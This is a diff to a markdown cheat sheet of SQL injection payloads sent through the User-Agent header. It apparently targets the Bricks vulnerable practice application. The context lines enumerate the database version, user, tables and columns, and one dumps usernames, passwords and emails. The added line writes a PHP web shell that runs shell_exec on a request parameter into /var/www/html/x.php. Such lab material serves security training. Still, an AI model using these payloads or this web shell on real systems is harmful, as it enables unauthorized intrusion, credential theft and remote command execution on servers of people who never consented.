@@ -16,6 +16,7 @@ POST Data: username=tom' UNION SELECT group_concat(name,0x0a,password,0x0a,email
 ### Advanced SQL Injection on user agent
 ```
 User-Agent: Brick_Browser' UNION SELECT 1,2,3,4,5,6,7,8 -- +
+User-Agent: Brick_Browser' union all select"<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/html/x.php'; -- x
 User-Agent: Brick_Browser' UNION SELECT database(),version(),user(),4,5,6,7,8 limit 1,1 -- +
 User-Agent: Brick_Browser' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 -- +
 User-Agent: Brick_Browser' UNION SELECT group_concat(column_name,0x0a),2,3,4,5,6,7,8 from information_schema.columns where table_name='users' LIMIT 1, 1 -- +
